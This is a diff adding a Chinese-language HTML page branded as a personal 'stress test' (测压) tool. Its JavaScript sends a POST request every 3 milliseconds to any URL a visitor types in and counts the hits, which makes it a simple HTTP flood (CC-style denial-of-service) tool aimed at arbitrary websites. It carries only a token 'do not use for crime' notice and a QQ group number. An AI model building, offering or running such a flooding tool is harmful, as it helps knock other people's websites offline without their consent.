@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>专属测压</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            background-image: url('Screenshot_2025_0208_210147.png'); /* 替换为你的背景图片地址 */
+            background-size: cover;
+            background-position: center;
+        }
+        input {
+            height: 40px; /* 增加输入框高度 */
+            padding: 0 20px; /* 增加输入框内边距 */
+            box-sizing: border-box;
+            outline: none;
+            border-radius: 20px; /* 设置圆角 */
+            border: 1px solid #ccc; /* 设置边框 */
+        }
+        #count {
+            margin-top: 20px;
+        }
+        #log {
+            width: 300px;
+            height: 200px;
+            overflow-y: scroll; /* 添加滚动条 */
+            margin-top: 20px;
+            border: 1px solid #ccc;
+            padding: 10px;
+            background-color: #fff; /* 设置日志区域背景色，以便更好地显示文字 */
+            font-size: 12px; /* 设置字体大小 */
+            color: #333; /* 设置字体颜色 */
+        }
+        .log-entry {
+            color: red; /* 设置日志条目颜色为红色 */
+            font-size: 12px; /* 设置日志条目字体大小 */
+        }
+        button {
+            border-radius: 50%; /* 设置圆形按钮 */
+            width: 50px; /* 设置按钮宽度 */
+            height: 50px; /* 设置按钮高度 */
+            border: none; /* 移除边框 */
+            background-color: #007bff; /* 设置按钮背景颜色 */
+            color: white; /* 设置按钮文字颜色 */
+            font-size: 16px; /* 设置按钮文字大小 */
+            cursor: pointer; /* 设置鼠标悬停时的指针样式 */
+            outline: none; /* 移除点击时的轮廓 */
+        }
+        .warning {
+            color: red; /* 设置警告信息颜色为红色 */
+            font-size: 12px; /* 设置警告信息字体大小 */
+        }
+    </style>
+</head>
+<body>
+    <p><a href="#">小海CC测压</a></p>
+    
+    <input type="text" placeholder="请输入需要被测压的网址" style="margin-right: 10px" />
+    <input type="button" value="开始" />
+    <div id="count">测压次数：0</div>
+    <div id="log">
+        <div class="warning">
+            本测压工具由小海提供，请勿用于违法犯罪！
+        </div>
+    </div> <!-- 日志输出区域 -->
+    <script>
+        let timer = null;
+        let count = 0; // 添加一个计数器
+        const input = document.querySelector('input[type="text"]');
+        const button = document.querySelector('input[type="button"]');
+        const countDisplay = document.getElementById('count'); // 获取显示测压次数的元素
+        const logDisplay = document.getElementById('log'); // 获取日志输出区域的元素
+        const warningMessage = document.querySelector('.warning'); // 获取警告信息元素
+
+        button.addEventListener('click', function () {
+            const url = input.value;
+            if (!url) return alert('请输入需要被测压的域名');
+            if (!url.startsWith('http')) return alert('请输入http或https开头的网址');
+        
+            if (this.value === '开始') {
+                this.value = '停止';
+                if (warningMessage) {
+                    logDisplay.removeChild(warningMessage); // 开始测试前移除警告信息
+                }
+                timer = setInterval(() => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send('name=name');
+                    count++; // 每次发送请求时增加计数器的值
+                    countDisplay.textContent = '测压次数：' + count; // 更新显示测压次数的元素
+                    const logEntry = document.createElement('div'); // 创建一个新的日志条目
+                    logEntry.className = 'log-entry'; // 给日志条目添加类名
+                    logEntry.textContent = '成功发送请求' + count + '次!'; // 设置日志条目的文本
+                    logDisplay.appendChild(logEntry); // 将日志条目添加到日志区域
+                    logDisplay.scrollTop = logDisplay.scrollHeight; // 自动滚动到底部
+                }, 3);
+            } else {
+                this.value = '开始';
+                clearInterval(timer);
+                // 测试停止后重新添加警告信息
+                const newWarningMessage = document.createElement('div');
+                newWarningMessage.className = 'warning';
+                newWarningMessage.textContent = '本测压工具由小海提供，请勿用于违法犯罪！';
+                newWarningMessage.textContent = '注：本测压工具由小海提供，请勿用于违法犯罪官方Q群：824189485';
+                logDisplay.appendChild(newWarningMessage); // 将警告信息添加到日志区域
+            }
+        });
+    </script>
+</body>
+</html>
